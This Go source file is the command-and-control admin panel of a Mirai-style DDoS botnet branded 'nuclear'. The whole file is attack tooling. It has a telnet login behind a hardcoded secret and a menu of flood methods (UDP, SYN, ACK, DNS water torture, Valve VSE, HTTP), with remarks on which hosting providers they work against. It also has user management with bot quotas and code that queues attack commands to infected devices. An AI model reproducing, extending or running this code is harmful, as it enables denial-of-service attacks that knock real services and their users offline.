package main

import (
    "fmt"
    "net"
    "time"
    "strings"
    "strconv"
)

type Admin struct {
    conn    net.Conn
}

func NewAdmin(conn net.Conn) *Admin {
    return &Admin{conn}
}


func (this *Admin) Handle() {
    this.conn.Write([]byte("\033[?1049h"))
    this.conn.Write([]byte("\xFF\xFB\x01\xFF\xFB\x03\xFF\xFC\x22"))

    defer func() {
        this.conn.Write([]byte("\033[?1049l"))
    }()

    // Get secret
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    secret, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // anti crash, fuck kidz
    if len(secret) > 20 {
        return
    }

    if secret != "nuclear" {
        return
    }

    // Get username
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[01;36mUsername\033[\033[01;37m: \033[0m"))
    username, err := this.ReadLine(false)
    if err != nil {
        return
    }

    // Get password
    this.conn.Write([]byte("\033[2J\033[1;1H"))
    this.conn.SetDeadline(time.Now().Add(60 * time.Second))
    this.conn.Write([]byte("\033[01;36mPassword\033[\033[01;37m: \033[0m"))
    password, err := this.ReadLine(true)
    if err != nil {
        return
    }
    //Attempt  Login
    this.conn.SetDeadline(time.Now().Add(120 * time.Second))
    this.conn.Write([]byte("\r\n"))
    spinBuf := []byte{'-', '\\', '|', '/'}
    for i := 0; i < 15; i++ {
        this.conn.Write(append([]byte("\r\033[01;37mPlease wait...\033[01;37m"), spinBuf[i % len(spinBuf)]))
        time.Sleep(time.Duration(10) * time.Millisecond)
    }
    this.conn.Write([]byte("\r\n"))

    //if credentials are incorrect output error and close session
    var loggedIn bool
    var userInfo AccountInfo
    if loggedIn, userInfo = database.TryLogin(username, password, this.conn.RemoteAddr()); !loggedIn {
        this.conn.Write([]byte("\r\033[01;90mWrong credentials.\r\n"))
        buf := make([]byte, 1)
        this.conn.Read(buf)
        return
    }
    //Header display bots connected, source name, client name
    this.conn.Write([]byte("\r\n\033[0m"))
    var komandz = 0;
    go func() {
        i := 0
        for {
            var BotCount int
            if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                BotCount = userInfo.maxBots
            } else {
                BotCount = clientList.Count()
            }

            time.Sleep(time.Second)
            if _, err := this.conn.Write([]byte(fmt.Sprintf("\033]0; %d devices / connected as: %s\007", BotCount, username))); err != nil {
                this.conn.Close()
                break
            }
            i++
            if i % 60 == 0 {
                this.conn.SetDeadline(time.Now().Add(120 * time.Second))
            }
        }
    }()
    this.conn.Write([]byte("\033[2J\033[1H")) //display main header

    for {
        var botCatagory string
        var botCount int
        this.conn.Write([]byte("\033[01;36m" + username + "\033[94m@\033[01;36mnuclear\033[94m# \x1b[97m"))
        cmd, err := this.ReadLine(false)
        
        if cmd == "" {
            continue
        }
        
        if err != nil || cmd == "c" || cmd == "cls" || cmd == "clear" { // clear screen 
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\033[2J\033[1H"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[1;34m                    $$$$$$$$$$$$$$$$$$$$$$$                         \r\n"))
            this.conn.Write([]byte("\033[1;34m                  $$$$___$$$$$$$$$$$$$$$$$$$$$                      \r\n"))
            this.conn.Write([]byte("\033[1;34m                $$$$______$$$$$$$$$$$$$$$$$$$$$$                    \r\n"))
            this.conn.Write([]byte("\033[1;34m              $$$$$________$$$$$$$$$$$$$$$$$$$$$$$                  \r\n"))
            this.conn.Write([]byte("\033[1;34m             $$$$$__________$$$$$$$$$$$$$$$$$$$$$$$                 \r\n"))
            this.conn.Write([]byte("\033[1;34m            $$$$$____________$$$$$$$$$$$$$$$$$$$$$$$                \r\n"))
            this.conn.Write([]byte("\033[1;34m           $$$$$$____________$$$$$$$$$$$$$$$$$$$$$$$$               \r\n"))
            this.conn.Write([]byte("\033[1;34m           $$$$$$___________$$$$$$$$$___________$$$$$$              \r\n"))
            this.conn.Write([]byte("\033[1;34m           $$…$$$$$_________$$$_$$$_$$$_________$$$$$               \r\n"))
            this.conn.Write([]byte("\033[1;34m           $$$$$$$$______$$$$___$___$$$$______$$$$$$$$              \r\n"))
            this.conn.Write([]byte("\033[1;34m           $$$$$$$$$$$$$$$$$___$$$___$$$$$$$$$$$$$$$$$              \r\n"))
            this.conn.Write([]byte("\033[1;34m           $$$_$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_o$$              \r\n"))
            this.conn.Write([]byte("\033[1;34m           $$$__$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$__$$$              \r\n"))
            this.conn.Write([]byte("\033[1;34m            $$$__$’$$$$$$$$$$$$$$$$$$$$$$$$$$$$$__o$$$              \r\n"))
            this.conn.Write([]byte("\033[1;34m            ’$$o__$$__$$’$$$$$$$$$$$$$$’$$__$$_____o$$              \r\n"))
            this.conn.Write([]byte("\033[1;34m              $$o$____$$__’$$’$$’$$’__$$______$___o$$               \r\n"))
            this.conn.Write([]byte("\033[1;34m               $$$o$__$____$$___$$___$$_____$$__o$                  \r\n"))
            this.conn.Write([]byte("\033[1;34m                ’$$$$O$____$$____$$___$$ ____o$$$                   \r\n"))
            this.conn.Write([]byte("\033[1;34m                   ’$$o$$___$$___$$___$$___o$$$                     \r\n"))
            this.conn.Write([]byte("\033[1;34m                      ’$$$$o$o$o$o$o$o$o$o$$$$                      \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }
        if cmd == "help" || cmd == "HELP" || cmd == "?" { // display help menu
            this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m flood methods\033[94m:\033[0m\r\n"))          
            this.conn.Write([]byte("\033[01;36m  !udp\033[94m:\033[97m udp flood, most working on OVH, NFO, simple flood more traffic\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m  !udpplain\033[94m:\033[97m udp flood with much more pps, custom payload (payload=b51hjg), limit pps (pps=100)\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m  !raw\033[94m:\033[97m a tunnel which turns UDP traffic into encrypted fake TCP/UDP/ICMP traffic by using raw cocket\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m  !std\033[94m:\033[97m complex std flood with less options more pps\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m  !syn\033[94m:\033[97m sending overhelming numbers of syn requests\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m  !ack\033[94m:\033[97m overloading server with tcp-ack packets\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m  !handshake\033[94m:\033[97m 3-way tcp handshake flood (sending syn, recieving syn+ack and overloading server with ack)\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m  !dns\033[94m:\033[97m specific dns water torture flood\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m  !valve\033[94m:\033[97m vse flood with new payload from valve servers, working on all valve games\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m  !socket\033[94m:\033[97m send custom message to tcp socket (eg. !socket 1.1.1.1 30 command='use port=9987' repeat=3)\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m  !http\033[94m:\033[97m http flood (also ssl/tls) many options, get/head/post, cookies, post data\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
            continue
        }
        
        
        if cmd == "flood" || cmd == "FLOOD" { // display methods and how to send an attack
            this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
            this.conn.Write([]byte("\033[1;34m flood methods\033[01;37m:\033[0m\r\n"))          
            this.conn.Write([]byte("\033[01;36m !udp\033[94m:\033[97m udp flood, most working on OVH, NFO, simple flood more traffic\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m !udpplain\033[94m:\033[97m udp flood with much more pps, custom payload (payload=b51hjg), limit pps (pps=100)\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m !raw\033[94m:\033[97m a tunnel which turns UDP traffic into encrypted fake TCP/UDP/ICMP traffic by using raw cocket\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m !std\033[94m:\033[97m complex std flood with less options more pps\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m !syn\033[94m:\033[97m sending overhelming numbers of syn requests\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m !ack\033[94m:\033[97m overloading server with tcp-ack packets\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m !handshake\033[94m:\033[97m 3-way tcp handshake flood (sending syn, recieving syn+ack and overloading server with ack)\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m !dns\033[94m:\033[97m specific dns water torture flood\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m !valve\033[94m:\033[97m vse flood with new payload from valve servers, working on all valve games\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m !socket\033[94m:\033[97m send custom message to tcp socket (eg. !socket 1.1.1.1 30 command='use port=9987' repeat=3)\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m !http\033[94m:\033[97m http flood (also ssl/tls) many options, get/head/post, cookies, post data\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
            continue
        }

        if userInfo.admin == 1 && cmd == "admin" {
            this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m Commands\033[94m:\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m  adduser\033[94m:\033[97m adding basic user\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m  addadmin\033[94m:\033[97m adding admin user\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36m  removeuser\033[94m:\033[97m removes user from database\033[0m\r\n"))
            this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
            continue
        }

        if err != nil || cmd == "logout" || cmd == "LOGOUT" {
            return
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "adduser" {
            this.conn.Write([]byte("\033[0mUsername:\033[01;37m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mPassword:\033[01;37m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[01;37m(\033[0m-1 for access to all\033[01;37m)\033[0m:\033[01;37m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;37m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 for none\033[01;37m)\033[0m:\033[01;37m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;37m" + new_un + "\r\n\033[0m- Password - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;37m(\033[001;36my\033[01;37m/\033[01;31mn\033[01;37m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateBasic(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if userInfo.admin == 1 && cmd == "removeuser" {
            this.conn.Write([]byte("\033[01;37mUsername: \033[0;35m"))
            rm_un, err := this.ReadLine(false)
            if err != nil {
                return
             }
            this.conn.Write([]byte(" \033[01;37mAre You Sure You Want To Remove \033[01;37m" + rm_un + "?\033[01;37m(\033[001;36my\033[01;37m/\033[01;31mn\033[01;37m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.RemoveUser(rm_un) {
            this.conn.Write([]byte(fmt.Sprintf("\033[01;31mUnable to remove users\r\n")))
            } else {
                this.conn.Write([]byte("\033[001;36mUser Successfully Removed!\r\n"))
            }
            continue
        }

        botCount = userInfo.maxBots

        if userInfo.admin == 1 && cmd == "addadmin" {
            this.conn.Write([]byte("\033[0mUsername:\033[01;37m "))
            new_un, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mPassword:\033[01;37m "))
            new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\033[0mBotcount\033[01;37m(\033[0m-1 for access to all\033[01;37m)\033[0m:\033[01;37m "))
            max_bots_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            max_bots, err := strconv.Atoi(max_bots_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the bot count")))
                continue
            }
            this.conn.Write([]byte("\033[0mAttack Duration\033[01;37m(\033[0m-1 for none\033[01;37m)\033[0m:\033[01;37m "))
            duration_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            duration, err := strconv.Atoi(duration_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the attack duration limit")))
                continue
            }
            this.conn.Write([]byte("\033[0mCooldown\033[01;37m(\033[0m0 for none\033[01;37m)\033[0m:\033[01;37m "))
            cooldown_str, err := this.ReadLine(false)
            if err != nil {
                return
            }
            cooldown, err := strconv.Atoi(cooldown_str)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to parse the cooldown")))
                continue
            }
            this.conn.Write([]byte("\033[0m- New user info - \r\n- Username - \033[01;37m" + new_un + "\r\n\033[0m- Password - \033[01;37m" + new_pw + "\r\n\033[0m- Bots - \033[01;37m" + max_bots_str + "\r\n\033[0m- Max Duration - \033[01;37m" + duration_str + "\r\n\033[0m- Cooldown - \033[01;37m" + cooldown_str + "   \r\n\033[0mContinue? \033[01;37m(\033[001;36my\033[01;37m/\033[01;31mn\033[01;37m) "))
            confirm, err := this.ReadLine(false)
            if err != nil {
                return
            }
            if confirm != "y" {
                continue
            }
            if !database.CreateAdmin(new_un, new_pw, max_bots, duration, cooldown) {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", "Failed to create new user. An unknown error occured.")))
            } else {
                this.conn.Write([]byte("\033[32;1mUser added successfully.\033[0m\r\n"))
            }
            continue
        }

        if cmd == "bots" || cmd == "BOTS" {
        botCount = clientList.Count()
            m := clientList.Distribution()
            this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
            this.conn.Write([]byte("\033[01;36mConnected devices\033[94m:\033[0m\r\n"))
            for k, v := range m {
                this.conn.Write([]byte(fmt.Sprintf("\033[01;36m%s\033[94m:\033[97m %d\033[0m\r\n", k, v)))
            }
            this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\033[01;36mTotal devices\033[94m:\033[97m %d\033[0m\r\n", botCount)))
            this.conn.Write([]byte("\033[01;37m  \033[0m\r\n"))
            continue
        }
        if cmd[0] == '-' {
            countSplit := strings.SplitN(cmd, " ", 2)
            count := countSplit[0][1:]
            botCount, err = strconv.Atoi(count)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mFailed to parse botcount \"%s\"\033[0m\r\n", count)))
                continue
            }
            if userInfo.maxBots != -1 && botCount > userInfo.maxBots {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1mBot count to send is bigger then allowed bot maximum\033[0m\r\n")))
                continue
            }
            cmd = countSplit[1]
        }
        if userInfo.admin == 1 && cmd[0] == '@' {
            cataSplit := strings.SplitN(cmd, " ", 2)
            botCatagory = cataSplit[0][1:]
            cmd = cataSplit[1]
        }

        atk, err := NewAttack(cmd, userInfo.admin)
        if err != nil {
            this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
        } else {
            buf, err := atk.Build()
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
            } else {
                if can, err := database.CanLaunchAttack(username, atk.Duration, cmd, botCount, 0); !can {
                    this.conn.Write([]byte(fmt.Sprintf("\033[31;1m%s\033[0m\r\n", err.Error())))
                } else if !database.ContainsWhitelistedTargets(atk) {
                    clientList.QueueBuf(buf, botCount, botCatagory)
                    var YotCount int
                    if clientList.Count() > userInfo.maxBots && userInfo.maxBots != -1 {
                        YotCount = userInfo.maxBots
                    } else {
                        YotCount = clientList.Count()
                    }
                    komandz += 1 
                    this.conn.Write([]byte(fmt.Sprintf("\033[01;36mattack command sent to \033[31;1m%d\033[0m\033[01;36m devices! id=7 slot=0 busybots=0\033[0m\r\n", YotCount)))
                } else {
                    fmt.Println("address is blacklisted!")
                }
            }
        }
    }
}

func (this *Admin) ReadLine(masked bool) (string, error) {
    buf := make([]byte, 1024)
    bufPos := 0

    for {
        n, err := this.conn.Read(buf[bufPos:bufPos+1])
        if err != nil || n != 1 {
            return "", err
        }
        if buf[bufPos] == '\xFF' {
            n, err := this.conn.Read(buf[bufPos:bufPos+2])
            if err != nil || n != 2 {
                return "", err
            }
            bufPos--
        } else if buf[bufPos] == '\x7F' || buf[bufPos] == '\x08' {
            if bufPos > 0 {
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos--
            }
            bufPos--
        } else if buf[bufPos] == '\r' || buf[bufPos] == '\t' || buf[bufPos] == '\x09' {
            bufPos--
        } else if buf[bufPos] == '\n' || buf[bufPos] == '\x00' {
            this.conn.Write([]byte("\r\n"))
            return string(buf[:bufPos]), nil
        } else if buf[bufPos] == 0x03 {
            this.conn.Write([]byte("^C\r\n"))
            return "", nil
        } else {
            if buf[bufPos] == '\033' {
                buf[bufPos] = '^';
                this.conn.Write([]byte(string(buf[bufPos])))
                bufPos++;
                buf[bufPos] = '[';
                this.conn.Write([]byte(string(buf[bufPos])))
            } else if masked {
                this.conn.Write([]byte("*"))
            } else {
                this.conn.Write([]byte(string(buf[bufPos])))
            }
        }
        bufPos++
    }
    return string(buf), nil
}